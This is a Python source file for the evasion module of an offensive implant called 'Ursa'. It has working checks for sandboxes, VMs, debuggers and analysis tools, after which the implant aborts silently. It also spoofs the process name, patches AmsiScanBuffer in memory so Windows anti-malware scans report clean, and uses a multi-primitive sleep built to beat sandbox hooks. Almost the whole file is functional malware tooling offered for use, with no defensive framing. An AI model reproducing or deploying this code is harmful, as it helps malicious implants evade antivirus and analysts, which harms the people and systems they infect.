"""Sandbox / VM detection and operational evasion for the Ursa implant.

Detection checks
----------------
Checks multiple environmental signals to decide whether the implant is
running inside an analysis environment (sandbox, VM, AV emulator).
If enough signals fire, the implant should abort silently.

Evasion primitives
------------------
- spoof_process_name  — change visible process name in ps/top
- amsi_bypass         — patch AmsiScanBuffer in-process (Windows)
- obfuscated_sleep    — staggered multi-primitive sleep to foil sleep hooks

Usage:
    from implants.evasion import is_sandbox, sandbox_checks
    from implants.evasion import amsi_bypass, obfuscated_sleep

    if is_sandbox():
        raise SystemExit(0)   # abort silently

    amsi_bypass()             # Windows: disable AMSI before loading payloads

    obfuscated_sleep(30)      # sleep 30s without a single time.sleep() call
"""

from __future__ import annotations

import os
import platform
import re
import select
import socket
import subprocess
import sys
import threading
import time

# ── Indicator databases ────────────────────────────────────────────────────────

# VMware, ESX, VirtualBox, QEMU/KVM, Xen, Parallels, Hyper-V
_VM_MAC_OUIS: frozenset[str] = frozenset({
    "00:0c:29",  # VMware Workstation
    "00:50:56",  # VMware ESX
    "00:05:69",  # VMware (legacy)
    "08:00:27",  # VirtualBox
    "52:54:00",  # QEMU/KVM
    "00:16:3e",  # Xen
    "00:1c:42",  # Parallels
    "00:03:ff",  # Hyper-V
    "00:15:5d",  # Hyper-V (alternate)
})

# Usernames that commonly appear in sandbox/analysis VMs
_SANDBOX_USERS: frozenset[str] = frozenset({
    "sandbox", "malware", "virus", "sample", "cuckoo",
    "norman", "nepenthes", "cwsandbox", "joebox",
    "john", "joe", "av", "avtest", "analyst", "analysis",
    "vmware", "vbox", "test", "user",
})

# CPU/hypervisor vendor strings found in /proc/cpuinfo
_VM_CPU_STRINGS: tuple[str, ...] = (
    "hypervisor", "vmware", "virtualbox", "qemu", "kvm", "xen",
    "bochs", "vbox",
)

# Hostname patterns common in auto-provisioned sandboxes
_SANDBOX_HOST_RE = re.compile(
    r"^(sandbox|malware|cuckoo|analysis|"
    r"win-[a-z0-9]{6,}|desktop-[a-z0-9]{6,}|"
    r"vm-\d+|vbox|vmware)",
    re.IGNORECASE,
)

# Known analysis / reverse-engineering tool process names
_ANALYSIS_PROCS: frozenset[str] = frozenset({
    # Network capture
    "wireshark", "tshark", "tcpdump", "fiddler", "charles",
    "mitmproxy", "burpsuite", "burp",
    # Dynamic analysis / sandboxes
    "cuckoo", "procmon", "procmon64", "processmonitor",
    "procexp", "procexp64", "autoruns", "autorunsc",
    "pestudio", "sandboxie", "sbiesvc",
    # Debuggers / disassemblers
    "x64dbg", "x32dbg", "ollydbg", "windbg", "immunity",
    "idaw", "idaq", "ida64", "ida32", "idapro", "ghidra",
    "radare2", "r2", "cutter",
    # VM guest agents / services
    "vmwaretray", "vmwareuser", "vmtoolsd",
    "vboxservice", "vboxtray", "vboxclient",
    # Monitoring / tracing
    "apimonitor", "regshot", "noriben",
    # Decompilers / hex editors
    "dnspy", "dotpeek", "reflexil", "hxd", "010editor",
})


# ── Hardware fingerprinting ────────────────────────────────────────────────────

def _total_ram_mb() -> int:
    """Return total system RAM in MB; 0 if unknown."""
    try:
        system = platform.system()
        if system == "Linux":
            with open("/proc/meminfo") as f:
                for line in f:
                    if line.startswith("MemTotal:"):
                        return int(line.split()[1]) // 1024
        elif system == "Darwin":
            out = subprocess.run(
                ["sysctl", "-n", "hw.memsize"],
                capture_output=True, text=True, timeout=3,
            )
            return int(out.stdout.strip()) // (1024 * 1024)
        elif system == "Windows":
            import ctypes
            import ctypes.wintypes

            class _MEMSTATEX(ctypes.Structure):
                _fields_ = [
                    ("dwLength",                ctypes.c_ulong),
                    ("dwMemoryLoad",            ctypes.c_ulong),
                    ("ullTotalPhys",            ctypes.c_ulonglong),
                    ("ullAvailPhys",            ctypes.c_ulonglong),
                    ("ullTotalPageFile",        ctypes.c_ulonglong),
                    ("ullAvailPageFile",        ctypes.c_ulonglong),
                    ("ullTotalVirtual",         ctypes.c_ulonglong),
                    ("ullAvailVirtual",         ctypes.c_ulonglong),
                    ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
                ]

            stat = _MEMSTATEX()
            stat.dwLength = ctypes.sizeof(_MEMSTATEX)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat))
            return stat.ullTotalPhys // (1024 * 1024)
    except Exception:
        pass
    return 0


def _cpu_core_count() -> int:
    """Return logical CPU count; 1 if unknown."""
    try:
        return os.cpu_count() or 1
    except Exception:
        return 1


def _disk_size_gb() -> float:
    """Return total size of the root/system disk in GB; 9999 if unknown."""
    try:
        import shutil
        root = "C:\\" if platform.system() == "Windows" else "/"
        total, _, _ = shutil.disk_usage(root)
        return total / (1024 ** 3)
    except Exception:
        return 9999.0


# ── Existing environment checks ───────────────────────────────────────────────

def _uptime_seconds() -> float:
    """Return system uptime in seconds; 9999 if unknown."""
    try:
        if platform.system() == "Linux":
            with open("/proc/uptime") as f:
                return float(f.read().split()[0])
        # macOS
        out = subprocess.run(
            ["sysctl", "-n", "kern.boottime"],
            capture_output=True, text=True, timeout=3,
        )
        m = re.search(r"sec\s*=\s*(\d+)", out.stdout)
        if m:
            return time.time() - int(m.group(1))
    except Exception:
        pass
    return 9999.0


def _mac_ouis() -> set[str]:
    """Return lowercase MAC OUI prefixes for all network interfaces."""
    ouis: set[str] = set()
    try:
        import uuid
        mac = uuid.getnode()
        oui = ":".join(f"{(mac >> (8 * (5 - i))) & 0xff:02x}" for i in range(3))
        ouis.add(oui.lower())
    except Exception:
        pass
    return ouis


def _cpu_has_vm_string() -> bool:
    """Return True if /proc/cpuinfo mentions a hypervisor or VM vendor."""
    try:
        with open("/proc/cpuinfo") as f:
            cpuinfo = f.read().lower()
        return any(s in cpuinfo for s in _VM_CPU_STRINGS)
    except Exception:
        return False


def _process_count() -> int:
    """Approximate number of running processes."""
    try:
        if platform.system() == "Linux":
            return sum(1 for e in os.scandir("/proc") if e.name.isdigit())
        out = subprocess.run(
            ["ps", "ax"], capture_output=True, text=True, timeout=5,
        )
        return max(0, len(out.stdout.splitlines()) - 1)
    except Exception:
        return 9999


def _dmi_has_vm_string() -> bool:
    """Check DMI/SMBIOS product name for VM indicators (Linux only)."""
    dmi_paths = [
        "/sys/class/dmi/id/product_name",
        "/sys/class/dmi/id/sys_vendor",
        "/sys/class/dmi/id/board_vendor",
    ]
    vm_strings = ("vmware", "virtualbox", "qemu", "kvm", "xen",
                  "bochs", "innotek", "parallels", "microsoft corporation")
    for path in dmi_paths:
        try:
            with open(path) as f:
                val = f.read().lower()
            if any(s in val for s in vm_strings):
                return True
        except Exception:
            pass
    return False


# ── Debugger detection ────────────────────────────────────────────────────────

def _debugger_attached() -> bool:
    """Return True if this process appears to be under a debugger.

    Methods (platform-dependent):
      Linux  : read TracerPid from /proc/self/status
      Windows: call kernel32.IsDebuggerPresent()
      macOS  : check P_TRACED flag via sysctl kern.proc.pid
    """
    system = platform.system()

    if system == "Linux":
        try:
            with open("/proc/self/status") as f:
                for line in f:
                    if line.startswith("TracerPid:"):
                        return int(line.split(":")[1].strip()) != 0
        except Exception:
            pass

    elif system == "Windows":
        try:
            import ctypes
            return bool(ctypes.windll.kernel32.IsDebuggerPresent())
        except Exception:
            pass

    elif system == "Darwin":
        try:
            out = subprocess.run(
                ["sysctl", f"kern.proc.pid.{os.getpid()}"],
                capture_output=True, text=True, timeout=3,
            )
            # P_TRACED = 0x00000800; field is "p_flag = 0x..."
            m = re.search(r"p_flag\s*=\s*0x([0-9a-fA-F]+)", out.stdout)
            if m:
                return bool(int(m.group(1), 16) & 0x800)
        except Exception:
            pass

    return False


# ── Analysis tool detection ───────────────────────────────────────────────────

def _analysis_tools_running() -> bool:
    """Return True if any known analysis / RE tool process names are running."""
    try:
        if platform.system() == "Windows":
            out = subprocess.run(
                ["tasklist", "/fo", "csv", "/nh"],
                capture_output=True, text=True, timeout=5,
            )
        else:
            out = subprocess.run(
                ["ps", "axo", "comm"],
                capture_output=True, text=True, timeout=5,
            )
        running = out.stdout.lower()
        return any(tool in running for tool in _ANALYSIS_PROCS)
    except Exception:
        return False


# ── Timing attack detection ───────────────────────────────────────────────────

def _timing_accelerated(test_secs: float = 1.0) -> bool:
    """Detect sandbox time-acceleration.

    Sleeps for `test_secs` seconds and measures actual elapsed time.
    Returns True if the elapsed time is less than half the requested
    sleep, indicating the sandbox sped up the clock.
    """
    start = time.monotonic()
    time.sleep(test_secs)
    elapsed = time.monotonic() - start
    return elapsed < test_secs * 0.5


# ── Public detection API ──────────────────────────────────────────────────────

def sandbox_checks(timing_check: bool = False) -> dict[str, bool]:
    """Run all sandbox/VM detection checks.

    Returns a dict mapping check-name → bool (True = indicator present).

    Args:
        timing_check: Include the timing-acceleration check (costs ~1s of sleep).
                      Disabled by default so startup is not delayed.
    """
    username = (os.getenv("USER") or os.getenv("USERNAME") or "").lower()
    hostname = socket.gethostname()
    uptime   = _uptime_seconds()
    proc_count = _process_count()
    ouis     = _mac_ouis()
    ram_mb   = _total_ram_mb()
    cores    = _cpu_core_count()
    disk_gb  = _disk_size_gb()

    checks: dict[str, bool] = {
        # Original checks
        "low_uptime":         uptime < 300,                    # < 5 min since boot
        "sandbox_user":       username in _SANDBOX_USERS,
        "sandbox_hostname":   bool(_SANDBOX_HOST_RE.match(hostname)),
        "vm_mac_oui":         bool(ouis & _VM_MAC_OUIS),
        "vm_cpu_string":      _cpu_has_vm_string(),
        "vm_dmi_string":      _dmi_has_vm_string(),
        "low_process_count":  proc_count < 30,
        # Hardware fingerprinting
        "low_ram":            0 < ram_mb < 2048,               # < 2 GB RAM
        "low_cpu_cores":      cores < 2,                       # single-core
        "small_disk":         0 < disk_gb < 60,                # < 60 GB disk
        # Debugger / analysis tools
        "debugger_attached":  _debugger_attached(),
        "analysis_tools":     _analysis_tools_running(),
    }

    if timing_check:
        checks["timing_accelerated"] = _timing_accelerated()

    return checks


def is_sandbox(min_hits: int = 2, timing_check: bool = False) -> bool:
    """Return True if at least `min_hits` sandbox indicators are detected.

    Defaults to 2 to avoid false-positives from any single coincidental match.
    Set min_hits=1 for maximum sensitivity.

    Args:
        min_hits: Number of indicators required to declare sandbox.
        timing_check: Include the timing-acceleration check (costs ~1s).
    """
    checks = sandbox_checks(timing_check=timing_check)
    return sum(1 for v in checks.values() if v) >= min_hits


# ── Operational evasion ───────────────────────────────────────────────────────

def spoof_process_name(name: str) -> bool:
    """Attempt to change the visible process name in ps/top/htop.

    Strategy (in priority order):
      1. setproctitle library — changes full cmdline in ps aux (best)
      2. ctypes prctl PR_SET_NAME — changes 15-char thread name on Linux
      3. sys.argv[0] mutation — minimal effect, last resort

    Returns True if at least one method succeeded.
    """
    success = False

    # Method 1: setproctitle (pip install setproctitle)
    try:
        import setproctitle as _spt
        _spt.setproctitle(name)
        success = True
    except ImportError:
        pass

    # Method 2: prctl PR_SET_NAME (Linux, stdlib ctypes, max 15 chars)
    if platform.system() == "Linux":
        try:
            import ctypes
            PR_SET_NAME = 15
            name_bytes = name[:15].encode() + b"\x00"
            ret = ctypes.cdll.LoadLibrary("libc.so.6").prctl(
                PR_SET_NAME, name_bytes, 0, 0, 0
            )
            if ret == 0:
                success = True
        except Exception:
            pass

    # Method 3: argv[0] — changes what some tools display (fallback)
    try:
        sys.argv[0] = name
        success = True
    except Exception:
        pass

    return success


def amsi_bypass() -> bool:
    """Patch AmsiScanBuffer in amsi.dll to always report clean (Windows only).

    Writes a 3-byte ``xor eax, eax / ret`` stub at the start of
    AmsiScanBuffer so every AMSI scan returns AMSI_RESULT_CLEAN (0).
    No-op and returns False on non-Windows platforms.

    Returns True if the patch was applied successfully.
    """
    if platform.system() != "Windows":
        return False

    try:
        import ctypes
        import ctypes.wintypes

        kernel32 = ctypes.windll.kernel32

        # Locate amsi.dll — load if not already mapped
        amsi_handle = kernel32.GetModuleHandleW("amsi.dll")
        if not amsi_handle:
            amsi_handle = kernel32.LoadLibraryW("amsi.dll")
        if not amsi_handle:
            return False

        # Get address of AmsiScanBuffer
        func_addr = kernel32.GetProcAddress(amsi_handle, b"AmsiScanBuffer")
        if not func_addr:
            return False

        # xor eax, eax  (31 C0)
        # ret           (C3)
        patch = (ctypes.c_char * 3)(0x31, 0xC0, 0xC3)

        # Temporarily make the page writable
        PAGE_EXECUTE_READWRITE = 0x40
        old_protect = ctypes.wintypes.DWORD(0)
        if not kernel32.VirtualProtect(
            ctypes.c_void_p(func_addr),
            ctypes.c_size_t(3),
            PAGE_EXECUTE_READWRITE,
            ctypes.byref(old_protect),
        ):
            return False

        # Write patch
        ctypes.memmove(ctypes.c_void_p(func_addr), patch, 3)

        # Restore original protection
        kernel32.VirtualProtect(
            ctypes.c_void_p(func_addr),
            ctypes.c_size_t(3),
            old_protect,
            ctypes.byref(ctypes.wintypes.DWORD(0)),
        )

        return True

    except Exception:
        return False


def obfuscated_sleep(seconds: float) -> None:
    """Sleep for `seconds` without a single blocking time.sleep() call.

    Splits the sleep into four equal chunks, each using a different
    OS/threading primitive so a simple sleep-API hook won't capture the
    full duration:

      1. threading.Event.wait()   — blocked on a kernel event object
      2. select() on a self-pipe  — blocked in kernel I/O wait
      3. threading.Condition.wait() — blocked on a mutex + condition
      4. time.sleep()             — tiny residual to absorb rounding

    Falls back gracefully on platforms where a primitive is unavailable.

    Args:
        seconds: Total sleep duration in seconds (clamped to >= 0).
    """
    if seconds <= 0:
        return

    chunk = seconds / 4.0

    # ── Chunk 1: threading.Event ──
    threading.Event().wait(timeout=chunk)

    # ── Chunk 2: select() on a self-pipe ──
    try:
        r_fd, w_fd = os.pipe()
        try:
            select.select([r_fd], [], [], chunk)
        finally:
            os.close(r_fd)
            os.close(w_fd)
    except (OSError, AttributeError):
        time.sleep(chunk)

    # ── Chunk 3: threading.Condition.wait ──
    cond = threading.Condition()
    with cond:
        cond.wait(timeout=chunk)

    # ── Chunk 4: residual time.sleep (small, absorbs rounding) ──
    time.sleep(chunk)
